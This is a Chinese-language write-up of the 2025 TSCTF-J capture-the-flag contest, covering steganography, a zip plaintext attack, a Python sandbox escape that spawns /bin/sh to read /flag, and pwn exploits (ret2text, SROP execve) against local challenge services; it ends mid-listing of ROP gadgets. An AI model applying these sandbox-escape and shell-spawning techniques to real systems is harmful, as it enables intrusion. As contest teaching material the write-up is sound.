# 2025 TSCTF-J Writeup

**作为 BUPT 的新生，当然不能错过一年一届的 TSCTF-J，于是上号打了一下（虽然有点老登炸鱼的嫌疑**

**自从大一那时候的校赛后，就没尝试过一个人打全方向的题了**

**也算是一种复健运动吧，找找当初刚学 CTF 时那种热血的感觉**

<!--more-->

| ![](imgs/image-20251014114436663.png)<br><br> |
| :-------------------------------------------: |

## Misc

### 题目名称 卢森堡的秘密

题目附件给了一张 PNG 图片，zsteg 一把梭了

![](imgs/image-20251010103004056.png)

`TSCTF-J{Th3_sEcre7_0f_L$B!}`

### 题目名称 Meow（一血）

题目附件给了一个 docx 文件，直接打开可以得到如下内容

![](imgs/image-20251010103110687.png)

改后缀为.zip，然后解压并打开可以得到如下提示：换了个base64的表

![](imgs/image-20251010103141983.png)

因此写个脚本解 base64 ，然后手动组合一下即可：``

```python
import base64
from itertools import permutations


custom_b64_alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
std_b64_alphabet   = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def custom_b64decode(s):
    trans = str.maketrans(custom_b64_alphabet, std_b64_alphabet)
    s = s.translate(trans)
    missing_padding = len(s) % 4
    if missing_padding:
        s += '=' * (4 - missing_padding)
    return base64.b64decode(s)

lines = [
    "vfndveyTsNSk",
    "mv9bBq==",
    "x01LB3Dnztb3",
    "xZrFq2fu",
    "iseHFq=="
]

for line in lines:
    print(custom_b64decode(line))
    
# TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}
```

### 题目名称 EzFix（一血）

题目附件给了一个Vmware虚拟机的虚拟磁盘镜像目录，我们主要关注 vmdk 文件

直接用 DiskGenius 挂载，在 TSCTF-J 用户的桌面上可以看到一个加密的压缩包和一个 PNG 图片

![](imgs/image-20251010103752210.png)

打开压缩包，Store+ZipCrypto 很明显提示了明文攻击

![](imgs/image-20251010103847212.png)

我们用 bkcrack 利用 PNG 文件头进行明文攻击即可
```bash
echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps > png_header
bkcrack -C flag_part2.zip -c useless.png -p png_header -o 0
bkcrack -C flag_part2.zip -c useless.png -k e9ac551e 24d21c15 097eb913 -U out.zip 123
```

用密码123解压即可得到第二段 flag：`9ood_4t_B50D!!!Wdf9u}`

第一段 flag 直接 strings 就行（感觉可能是非预期

![](imgs/image-20251010104141528.png)

综上，最后的 flag：`TSCTF-J{w0w_Y0u_4rE_9ood_4t_B50D!!!Wdf9u}`

### 题目名称 秃头！真是！太棒啦！（一血）

题面信息如下：

> 你的头发有什么用？快将这种没用的东西统统拿掉！让我看到最干净的你！
> 
> 请构建一个不超过100字节的ELF程序，使之可以输出字符串“秃头！真是！太棒啦！”。
> 
> 你可以使用附件中的solve.py协助你与服务器交互。

并且题目给了如下提示：

> 目标字符串：b'\xe7\xa7\x83\xe5\xa4\xb4\xef\xbc\x81\xe7\x9c\x9f\xe6\x98\xaf\xef\xbc\x81\xe5\xa4\xaa\xe6\xa3\x92\xe5\x95\xa6\xef\xbc\x81'

网上找到了参考的汇编代码：https://gist.github.com/antsaasma/2578795

只不过它输出的是`Hello world`

```
  BITS 32
      org     0x00010000
  
      db      0x7F, "ELF"             ; e_ident
      dd      1                                       ; p_type
      dd      0                                       ; p_offset
      dd      $$                                      ; p_vaddr 
      dw      2                       ; e_type        ; p_paddr
      dw      3                       ; e_machine
      dd      _start                  ; e_version     ; p_filesz
      dd      _start                  ; e_entry       ; p_memsz
      dd      4                       ; e_phoff       ; p_flags
  _cont:
      mov     dl, string_len          ; e_shoff       ; p_align
      int     0x80                    
      mov     al, 1                   ; e_flags
      xor     bl,bl
      int     0x80                    ; e_ehsize
      dw      0x20                    ; e_phentsize
      dw      1                       ; e_phnum
  _start:
      mov     al, 04                  ; e_shentsize
      mov     bl, 01                  ; e_shnum
      mov     ecx, string_start       ; e_shstrndx
      jmp     _cont                   
  string_start:
      db "Hello world", 0x0a
  string_len equ $ - string_start

  filesize      equ     $ - $$
```

对照上面的代码，修改一下然后编译即可

```
BITS 32
org 0x00010000

db 0x7F, "ELF"       ; e_ident
dd 1                 ; p_type
dd 0                 ; p_offset
dd $$                ; p_vaddr 
dw 2                 ; e_type
dw 3                 ; e_machine
dd _start            ; e_version
dd _start            ; e_entry
dd 4                 ; e_phoff
_cont:
mov dl, string_len   ; e_shoff
int 0x80                    
mov al, 1            ; e_flags
xor ebx, ebx
int 0x80             ; e_ehsize
dw 0x20              ; e_phentsize
dw 1                 ; e_phnum
_start:
mov al, 4            ; e_shentsize
mov bl, 1            ; e_shnum
mov ecx, string_start ; e_shstrndx
jmp _cont                   
string_start:
db 0xe7,0xa7,0x83,0xe5,0xa4,0xb4,0xef,0xbc,0x81,0xe7,0x9c,0x9f,0xe6,0x98,0xaf,0xef,0xbc,0x81,0xe5,0xa4,0xaa,0xe6,0xa3,0x92,0xe5,0x95,0xa6,0xef,0xbc,0x81, 0x0a
string_len equ $ - string_start

filesize equ $ - $$
```

```bash
nasm -f bin -o test.elf test.asm
```

```python
from pwn import *

p = remote('127.0.0.1', 49345)

f = open('test.elf', 'rb')
content = f.read()
f.close()

print(f"ELF 文件大小: {len(content)} 字节")

p.recvuntil('“秃头！真是！太棒啦！”\n'.encode())
p.send(content)

p.interactive()
```

![](imgs/image-20251010135533526.png)

### 题目名称  BadFile（一血）

题面信息如下：

> 在附件的每个文件夹内各有100份文件，其中各有5份存在隐私泄露或恶意代码，请你找出这15份文件，按照txt,wav,pdf的文件类型顺序，将文件名（带后缀）按照字典序用_连接后计算md5值，并使用TSCTF-J{}包裹后提交。

对于 txt 文件，100 个完全可以手动一个个查看，基本上就是手机号、地址、身份证号这些

![](imgs/image-20251011114459989.png)

对于 PDF 文件，我们可以用以下命令转为 txt 文件，然后按照大小降序排列

```bash
mkdir -p txt && for f in *.pdf; do strings "$f" > "txt/${f%.pdf}.txt"; done
```

然后就能看到 XSS 注入的恶意代码

![](imgs/image-20251011114700038.png)

对于 wav 文件，先按大小排列能找出四个，剩下的最后一个语音转文字一个个看就行

```python
import os
import whisper

model = whisper.load_model("base")

filelist = os.listdir('wav')
# print(filelist)
for filename in filelist:
    filepath = './wav/' + filename
    result = model.transcribe(filepath, language='zh')
    print(filepath,result["text"])
```

最后找出来的文件是下面代码里这几个，写个脚本排序然后算一下 MD5 即可

```python
import hashlib

txtfile = "3WQlwSaj.txt dubZ3AZn.txt nhlbNxGL.txt qtFyaGkZ.txt wlBUCOeg.txt".split()
wavfile = "2JuiKL42.wav 4UjLqeRF.wav Ew24ldS2.wav HjRtD6f3.wav RtUwEgj1.wav".split()
pdffile = "8YmxZRca.pdf mFU1SdVp.pdf w9V1ZDEd.pdf xdBqKtxe.pdf Z8P4DHre.pdf".split()

txtfile_sorted = sorted(txtfile)
wavfile_sorted = sorted(wavfile) 
pdffile_sorted = sorted(pdffile)

print("排序后的文件:")
print("TXT:", txtfile_sorted)
print("WAV:", wavfile_sorted)
print("PDF:", pdffile_sorted)

combined = txtfile_sorted + wavfile_sorted + pdffile_sorted
filename_string = "_".join(combined)
print(f"\n连接后的字符串: {filename_string}")

md5_hash = hashlib.md5(filename_string.encode('utf-8')).hexdigest()
print(f"\nMD5 值: {md5_hash}")
# MD5 值: 0b4a2a6431f6b94b3c1d3d50d0a45aea
```

`TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}`

### 题目名称  PyJail（一血）

题目改自 2025 Mini-L CTF PyJail

附件给的源代码如下

```python
import socketserver
import sys
import ast
import io


class ASTChecker(ast.NodeVisitor):
    def visit_Attribute(self, node):
        if isinstance(node.attr, str) and node.attr.startswith("__"):
            raise ValueError("Cannot access private attributes")
        self.generic_visit(node)

def execute_safely(code: str, safe_globals=None):
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    if safe_globals is None:
        safe_globals = {
            "__builtins__": {
                "print": print,
                "any": any,
                "len": len,
                "RuntimeError": RuntimeError,
                "addaudithook": sys.addaudithook,
                "original_stdout": sys_stdout,
                "original_stderr": sys_stderr
            }
        }

    try:
        parsed_tree = ast.parse(code)
        ASTChecker().visit(parsed_tree)

        exec(code, safe_globals)
        output = sys.stdout.getvalue()

        sys.stdout = sys_stdout
        sys.stderr = sys_stderr

        return output, safe_globals
    except Exception as error:
        sys.stdout = sys_stdout
        sys.stderr = sys_stderr
        return f"Error: {str(error)}", safe_globals

AUDIT_CODE = """
def audit_monitor(event, args):
    restricted_actions = [
        "import", "time.sleep", "builtins.input", "builtins.input/result", "open", "os.system",
        "eval", "subprocess.Popen", "subprocess.call", "subprocess.run", "subprocess.check_output"
    ]
    if event in restricted_actions or event.startswith("subprocess."):
        raise RuntimeError(f"Action blocked: {event}")

addaudithook(audit_monitor)
"""

class ClientHandler(socketserver.BaseRequestHandler):
    def _send_welcome(self):
        self.request.sendall(b"Welcome to the Python Sandbox!\n")
        self.request.sendall(b"Rules: No imports, no sleep, no input allowed\n\n")

    def _process_client_input(self, audit_code, safe_globals):
        while True:
            self.request.sendall(b">>> ")
            try:
                client_code = self.request.recv(4096).decode().strip()
                if not client_code:
                    continue
                if client_code.lower() == "exit":
                    self.request.sendall(b"Goodbye!\n")
                    break

                complete_code = audit_code + client_code + "\n"
                audit_code = ""

                result, safe_globals = execute_safely(complete_code, safe_globals)
                self.request.sendall(result.encode() + b"\n")
            except Exception as error:
                self.request.sendall(f"Error: {str(error)}\n".encode())
                break

    def handle(self):
        self._send_welcome()
        self.request.sendall(b"Enter your code line by line. Use 'exit' to disconnect.\n\n")

        audit_code = AUDIT_CODE
        safe_globals = None
        self._process_client_input(audit_code, safe_globals)

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 8000
    with socketserver.ThreadingTCPServer((HOST, PORT), ClientHandler) as server:
        print(f"Server running on {HOST}:{PORT}")
        server.serve_forever()
```

网上找到官方WP：https://blog.csdn.net/2301_80160378/article/details/148563157

还有一篇关于栈帧沙箱逃逸的参考文章：https://www.cnblogs.com/gaorenyusi/p/18242719

只能说是几乎一模一样，出题人就改了个函数名，因此我们直接对着改就好了

```bash
a = (a.gi_frame.f_back.f_back for i in [1])
a = [x for x in a][0]
globals['ASTChecker'].visit_Attribute=lambda x,y:None
os=globals["__builtins__"].__import__("os")
sys=globals["__builtins__"].__import__("sys")
iter=globals["__builtins__"].iter
exec=globals["__builtins__"].exec
a='run_command = lambda cmd: ((lambda r, w, pid: ((pid == 0 and (os.close(r), os.dup2(w,'
a+='original_stdout.fileno()),os.dup2(w, original_stdout.fileno()),os.execlp("/bin/sh", "sh"'
a+=', "-c", cmd) )) or (os.close(w), (output :=b"".join(iter(lambda: os.read(r, 4096), b""))'
a+='.decode()),os.close(r), os.waitpid(pid, 0),output )[4] ))(*os.pipe(), os.fork()))'
exec(a)
print(run_command('cat /flag'))
```

![](imgs/image-20251011220235755.png)

### 题目名称 ListLoadMaster（一血）

题面信息如下：

> Do you know how to create list in Python?
> 
> Python-3.12 x64

附件给的源代码如下：

```python
import ast
import socket
from sys import getsizeof

host = "0.0.0.0"
port = 8000
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
conn, addr = server.accept()

class SafeListExec:
    def __init__(self):
        self.safe_globals = {"range": range, "list": list}
        self.safe_locals = {}

    def check_expr(self, node):
        if isinstance(node, ast.Constant):
            return isinstance(node.value, (int, float, str, bool, type(None)))
        elif isinstance(node, ast.List):
            return all(self.check_expr(elt) for elt in node.elts)
        elif isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mult):
            return self.check_expr(node.left) and self.check_expr(node.right)
        elif isinstance(node, ast.ListComp):
            if not self.check_expr(node.elt):
                return False
            for gen in node.generators:
                if not isinstance(gen.target, ast.Name) or gen.target.id != "_":
                    return False
                if not (isinstance(gen.iter, ast.Call) and isinstance(gen.iter.func, ast.Name)
                        and gen.iter.func.id == "range" and all(self.check_expr(arg) for arg in gen.iter.args)):
                    return False
                for cond in gen.ifs:
                    if not self.check_expr(cond):
                        return False
            return True
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in {"list", "range"}:
                    return all(self.check_expr(arg) for arg in node.args)
        return False

    def check_stmt(self, node):
        if isinstance(node, ast.Assign):
            if len(node.targets) != 1 or not isinstance(node.targets[0], ast.Name):
                return False
            return self.check_expr(node.value)
        elif isinstance(node, ast.Expr) and isinstance(node.value, ast.Call):
            call = node.value
            if isinstance(call.func, ast.Attribute):
                if isinstance(call.func.value, ast.Name) and call.func.attr in {"append", "extend"}:
                    return all(self.check_expr(arg) for arg in call.args)
            return False
        return False

    def exec(self, code: str):
        tree = ast.parse(code, mode="exec")
        for node in tree.body:
            if not self.check_stmt(node):
                raise ValueError("Not allowed statements: " + ast.dump(node))
        exec(compile(tree, "<ast>", "exec"), self.safe_globals, self.safe_locals)
        return self.safe_locals


def check_list_dim(lst):
    if not isinstance(lst, list):
        raise ValueError("The input must be a list")
    if not lst:
        return 1
    if all(not isinstance(x, list) for x in lst):
        return 1
    if all(isinstance(x, list) and all(not isinstance(y, list) for y in x) for x in lst):
        return 2
    raise ValueError("Only one-dimensional or two-dimensional lists are allowed and cannot be mixed")

def count_elements(lst):
    if not isinstance(lst, list):
        raise ValueError("The input must be a list")
    if not lst:
        return 0
    if all(not isinstance(x, list) for x in lst):
        return len(lst)
    if all(isinstance(x, list) and all(not isinstance(y, list) for y in x) for x in lst):
        return sum(len(x) for x in lst)
    raise ValueError("Only one-dimensional or two-dimensional lists are allowed and cannot be mixed")


def get_input(dim):
    conn.sendall(b">> ")
    code = conn.recv(4096).decode().strip()

    if not code.startswith("lst"):
        raise ValueError("The code must start with 'lst'")

    executor = SafeListExec()
    local_vars = executor.exec(code)
    if "lst" not in local_vars:
        raise ValueError("The variable 'lst' must be defined in the code")

    lst = local_vars["lst"]
    assert check_list_dim(lst) == dim, "Dimension does not meet the requirements"

    return lst


def challenge_one():
    lst_a = get_input(1)
    length = count_elements(lst_a)
    if not getsizeof(lst_a) == 96:
        exit(1)

    lst_b = get_input(1)
    len_b = count_elements(lst_b)
    if len_b != length or (not getsizeof(lst_b) == 104):
        exit(1)

    lst_c = get_input(1)
    len_c = count_elements(lst_c)
    if len_c != length or (not getsizeof(lst_c) == 120):
        exit(1)

    conn.sendall(b"Challenge 1 passed!\n")

def challenge_two():
    lst_a = get_input(2)
    length = count_elements(lst_a)
    if not getsizeof(lst_a) == 64:
        exit(1)

    lst_b = get_input(2)
    len_b = count_elements(lst_b)
    if len_b != length or (not getsizeof(lst_b) == 96):
        exit(1)

    lst_c = get_input(2)
    len_c = count_elements(lst_c)
    if len_c != length or (not getsizeof(lst_c) == 120):
        exit(1)

    conn.sendall(b"Challenge 2 passed!\n")

try:
    challenge_one()
    challenge_two()
except (ValueError, AssertionError) as e:
    conn.sendall(f"{e}".encode())
    conn.close()
    server.close()
    exit(1)

flag = open("/flag", "r", encoding="utf-8").read().strip()
conn.sendall(f"Congratulations! Here is your flag: {flag}\n".encode())
conn.close()
server.close()
```

分析下代码，发现题目的意思就是在通过题目安全检测的前提下，

分别生成三个元素个数相同，但是所占内存空间大小不同的一维和二维列表

参考链接：https://github.com/python/cpython/blob/0fb18b02c8ad56299d6a2910be0bab8ad601ef24/Objects/listobject.c

```python
from sys import getsizeof

# Challenge 1
lst = [0] * 5 # 96
lst = list(range(5)) # 104
lst = [0 for _ in range(5)] # 120

# Challenge 2
lst = [[0]*6] # 64
lst = [[0]*6, [], [], [],[]] # 96
lst = [[0,0,0], [0,0,0]];lst.append([]) # 120

print(lst)
print(getsizeof(lst))
```

![](imgs/image-20251011224241726.png)


### 题目名称 QQGroup

题面信息如下:

> How to join a QQ group?By Searching?Or not! I and D is useful!
> 
> Flag matches the following regular expression:^TSCTF-J\{[a-zA-Z0-9_#!]+\}$

根据题面提示先异或一下 I 和 D，可以得到一张字节顺序被修改过的 PNG 图片

![](imgs/image-20251011115410877.png)

写个脚本还原一下

```python
def reverse_8bytes(data):
    with open("download.dat",'rb') as f:
        data = f.read()
        
    reversed_blocks = []
    for i in range(0, len(data), 8):
        block = data[i:i+8]
        reversed_block = block[::-1]  # reverse the 8-byte block
        reversed_blocks.append(reversed_block)
        
    res = b''.join(reversed_blocks)
    # print(res[:100])
    with open("output.png",'wb') as f:
        f.write(res)
```

还原后可以得到下图

![](imgs/image-20251011115523547.png)

图片看起来有点暗，放大后发现是一明一暗的像素交错的

![](imgs/image-20251011115600372.png)

这其实是一种图片隐写：[光棱坦克](https://www.52pojie.cn/thread-2051184-1-1.html)

如果没听说过也没关系，自己手搓个脚本交错提取出像素点也行

```python
from PIL import Image
import itertools
from pathlib import Path
import posixpath
import sys


def detect_stripe_modulus(img: Image.Image, max_modulus=6, threshold=0.4):
    img = img.convert("L")
    pixels = img.load()
    height, width = img.size

    best_score = 0
    best_mod = 2
    best_xoff = 1

    for xoff in range(1, max_modulus + 1):
        for x_mod in range(2, max_modulus + 1):
            score = 0
            total = 0
            for y in range(0, height, 6):
                for x in range(0, width, 9):
                    if (x + y * xoff) % (x_mod) == 0:
                        if pixels[y, x] / 255 < threshold:
                            score += 1
                        total += 1
                    else:
                        if pixels[y, x] / 255 >= threshold:
                            score += 1
                        total += 1

            match_ratio = score / total
            print(xoff, x_mod, "match_ratio", score, match_ratio)
            if match_ratio > best_score:
                best_score = match_ratio
                best_mod = x_mod
                best_xoff = xoff
            if match_ratio == 1:
                break

    return best_mod, best_xoff


def get_circle_pixels(center_x, center_y, r, max_x, max_y):
    """
    使用中点圆算法生成圆环上的所有整数坐标点（去重）
    返回: set of (x, y) 整数坐标
    """
    points = set()
    x = 0
    y = int(r + 0.5)
    p = 1 - y

    def add_symmetric_points(cx, cy, x, y):
        """添加8个对称点"""
        points.add((cx + x, cy + y))
        points.add((cx - x, cy + y))
        points.add((cx + x, cy - y))
        points.add((cx - x, cy - y))
        points.add((cx + y, cy + x))
        points.add((cx - y, cy + x))
        points.add((cx + y, cy - x))
        points.add((cx - y, cy - x))

    add_symmetric_points(center_x, center_y, x, y)

    while x < y:
        x += 1
        if p < 0:
            p += 2 * x + 1
        else:
            y -= 1
            p += 2 * (x - y) + 1
        add_symmetric_points(center_x, center_y, x, y)

    return set([p for p in points if 0 <= p[0] < max_x and 0 <= p[1] < max_y])


def extract_both_images(p, xoff=None, xmod=None):
    path = Path(p)
    ori = Image.open(path)
    
    # 确保图像是RGBA模式
    if ori.mode != 'RGBA':
        ori = ori.convert('RGBA')
    
    # 创建里图和表图的画布
    inner_image = Image.new('RGBA', ori.size)
    outer_image = Image.new('RGBA', ori.size)
    
    inner_pixels = inner_image.load()
    outer_pixels = outer_image.load()
    
    print(xoff, xmod)
    
    if xmod is None or xoff is None:
        xmod, xoff = detect_stripe_modulus(ori)
    
    print("检测到的参数:", xoff, xmod, ori.size)
    
    # === 提取里图 ===
    print("正在提取里图...")
    lmax = 0
    
    # 第一遍：计算里图的最大RGB值
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        if not (x + y * xoff) % (xmod) == 0:
            continue
        r, g, b, a = ori.getpixel((x, y))
        lmax = max(r, g, b, lmax)
    
    amp = 255 / lmax if lmax > 0 else 1
    print(f"里图最大亮度: {lmax}, 放大系数: {amp}")

    # 第二遍：增强里图的采样点
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        if not (x + y * xoff) % (xmod) == 0:
            continue
        r, g, b, a = ori.getpixel((x, y))
        r = int(min(r * amp, 255))
        g = int(min(g * amp, 255))
        b = int(min(b * amp, 255))
        inner_pixels[x, y] = (r, g, b, a)

    # 第三遍：填充里图的非采样点
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        if (x + y * xoff) % (xmod) == 0:
            continue
        
        n = 0
        r, g, b, a = (0, 0, 0, 0)
        radius = 1
        while n == 0:
            for rx, ry in get_circle_pixels(x, y, radius, ori.size[0], ori.size[1]):
                if not (rx + ry * xoff) % (xmod) == 0:
                    continue
                rr, gg, bb, aa = inner_image.getpixel((rx, ry))
                r += rr
                g += gg
                b += bb
                a += aa
                n += 1
            radius += 1
        
        if n > 0:
            inner_pixels[x, y] = (r // n, g // n, b // n, a // n)
        else:
            inner_pixels[x, y] = ori.getpixel((x, y))

    # === 提取表图 ===
    print("正在提取表图...")
    
    # 表图就是去除里图增强效果后的原始图像
    # 但对于条纹位置的像素，我们需要恢复其原始外观
    
    for y, x in itertools.product(*[range(r) for r in ori.size[::-1]]):
        r, g, b, a = ori.getpixel((x, y))
        
        # 如果是条纹位置，可能需要调整以显示表图的完整外观
        # 这里我们直接使用原始像素值，但可以做一些调整让表图更清晰
        if (x + y * xoff) % (xmod) == 0:
            # 条纹位置：稍微增强对比度让表图更明显
            factor = 1.2
            r = int(min(r * factor, 255))
            g = int(min(g * factor, 255))
            b = int(min(b * factor, 255))
        
        outer_pixels[x, y] = (r, g, b, a)

    # 保存图像
    base_name = posixpath.splitext(path.name)[0]
    inner_image.save(path.parent / f"{base_name}_inner.png")
    outer_image.save(path.parent / f"{base_name}_outer.png")
    
    print(f"提取完成！")
    print(f"里图保存为: {base_name}_inner.png")
    print(f"表图保存为: {base_name}_outer.png")
    
    return inner_image, outer_image


def create_comparison_image(inner, outer):
    """创建对比图像，左右显示里图和表图"""
    width = inner.size[0] * 2
    height = inner.size[1]
    
    comparison = Image.new('RGBA', (width, height))
    
    # 左边放里图，右边放表图
    comparison.paste(inner, (0, 0))
    comparison.paste(outer, (inner.size[0], 0))
    
    return comparison


if __name__ == "__main__":
    # 直接处理output.png文件
    input_file = "output.png"
    
    if Path(input_file).exists():
        print(f"正在处理 {input_file}...")
        if len(sys.argv) == 3:
            # 如果提供了参数：python script.py x_offset x_modulus
            inner, outer = extract_both_images(input_file, int(sys.argv[1]), int(sys.argv[2]))
        else:
            # 自动检测模式
            inner, outer = extract_both_images(input_file)
        
        # 创建对比图
        comparison = create_comparison_image(inner, outer)
        comparison.save("comparison.png")
        print(f"对比图保存为: comparison.png")
        
    else:
        print(f"错误：找不到文件 {input_file}")
        print("请确保output.png存在于当前目录")
```

提取出来后可以得到下面这两张图片，分别是表图和里图


| ![](imgs/image-20251012233500170.png)<br><br> | ![](imgs/image-20251012233505728.png)<br><br> |
| :-------------------------------------------: | :-------------------------------------------: |

仔细看会发现里图里的QQ群的群号和表图是不一样的，而且隐藏了群聊名称

QQ 上搜索`1060905286`会发现搜不到这个群，猜测是群主关闭了通过群号和关键字搜索

后续需要我们加群获得进一步的信息，不能通过搜索群号加群，这里提供另外两种方法

第一种就是参考[这篇文章](https://blog.csdn.net/u014374009/article/details/105385887)，利用移动端跳转的API，跳转到加群页面

> mqqapi://card/show_pslcard?src_type=internal&version=1&card_type=group&uin=1060905286

第二种就是参考[这篇博客](https://cabelis.ink/2023/01/16/crash-qrcode-by-hand/)，修复二维码后扫码加群

![](imgs/image-20251013222642047.png)

发现加群需要正确回答问题，于是这一步才到 OSINT 社工的部分

![](imgs/image-20251013222747240.png)

通过社工找到[出题人的博客](https://sus-morn.tech/)，点击`新生常见问题解答`这篇文章，可以发现招新赛跳转的链接是有问题的

提示了我们一个 Github Commit 的 hash

![](imgs/image-20251013225547631.png)

 因此我们可以直接在 Github 上搜这个 hash

![](imgs/image-20251013225738669.png)

可以定位到具体的仓库，最后在 URL 中的 commit 后跟上这个 hash 值即可得到群问题的答案：`‬‌‌‌‌‍‬‍‍u_answer_here`

![](imgs/image-20251013225511184.png)

直接复制这个答案加群会发现回答错误，仔细数了一下字数发现不太对

![](imgs/image-20251014175818276.png)

原来是藏了零宽，手动输入答案 (13字符) 后即可成功加入群聊

![](imgs/image-20251014175900071.png)

加入群聊后查看群公告即可得到最后的 flag：`TSCTF-J{f4k3_fl4g_f1nd_4n0nth3r_pl5!!!}`

![](imgs/image-20251014180133130.png)

## Pwn

### 题目名称 ret

ret2text，直接给了后门

![](imgs/image-20251010110150140.png)

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = remote('127.0.0.1', 61515)  # 如果是远程题目
backdoor_addr = 0x0400676

offset = 16 + 8
payload = b'A' * offset  # 填充缓冲区 + rbp
payload += p64(backdoor_addr)  # 覆盖返回地址为 backdoor

p.sendlineafter(b"Just a simple sign-in!", payload)
p.interactive()
```

![](imgs/image-20251010110039246.png)

### 题目名称 Easy-syscall

```bash
(base) ➜  Downloads ROPgadget --binary pwn
Gadgets information
============================================================
0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret
0x00000000004010bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401221 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010be : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401223 : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401183 : add byte ptr [rax], al ; syscall
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401157 : add eax, 0x2efb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004011bf : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401173 : cli ; jmp 0x401100
0x00000000004010c3 : cli ; ret
0x000000000040122b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401170 : endbr64 ; jmp 0x401100
0x00000000004010c0 : endbr64 ; ret
0x000000000040117d : in eax, 0x48 ; mov eax, 0xf ; syscall
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401174 : jmp 0x401100
0x000000000040100b : jmp 0x4840103f
0x00000000004010ec : jmp rax
0x00000000004011c1 : leave ; ret
0x00000000004010ed : loopne 0x401155 ; nop ; ret
0x0000000000401156 : mov byte ptr [rip + 0x2efb], 1 ; pop rbp ; ret
0x0000000000401220 : mov eax, 0 ; pop rbp ; ret
0x000000000040117f : mov eax, 0xf ; syscall
0x000000000040117c : mov ebp, esp ; mov rax, 0xf ; syscall
0x00000000004010e7 : mov edi, 0x404040 ; jmp rax
0x000000000040117e : mov rax, 0xf ; syscall
0x00000000004011c0 : nop ; leave ; ret
0x0000000000401187 : nop ; pop rbp ; ret
0x00000000004010ef : nop ; ret
0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100
0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax
0x000000000040115d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401180 : ror byte ptr [rdi], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401158 : sti ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040122d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040122c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401185 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
```

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'
p = remote("127.0.0.1",61027)

# 找到的 gadget 地址
syscall = 0x401185
binsh_addr = 0x402008
pop_rbp = 0x40115d
ret = 0x40101a

# 构造 SROP payload
frame = SigreturnFrame()
frame.rax = 59           # execve 系统调用号
frame.rdi = binsh_addr   # "/bin/sh" 字符串地址
frame.rsi = 0            # argv = NULL
frame.rdx = 0            # envp = NULL
frame.rip = syscall      # 执行 syscall

payload = b'A' * (48 + 8)  # 填充缓冲区 + rbp

# 首先设置 rax = 0xf (sigreturn 系统调用号)
# 我们需要找到一个设置 rax 的方法
# 观察发现 0x40117f : mov eax, 0xf ; syscall
mov_eax_0xf = 0x40117f

payload += p64(mov_eax_0xf)  # 设置 rax=0xf 并执行 syscall
payload += bytes(frame)       # sigreturn frame

p.sendlineafter(b"It seems that something is hidden here...", payload)
p.interactive()
```

![](imgs/image-20251010105649972.png)

### 题目名称 pop（三血）

```
(base) ➜  attachment ROPgadget --binary pwn
Gadgets information
============================================================
0x0000000000400582 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400581 : adc byte ptr [rax], spl ; jmp rax
0x000000000040057e : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400507 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x000000000040071f : add bl, dh ; ret
0x000000000040071d : add byte ptr [rax], al ; add bl, dh ; ret
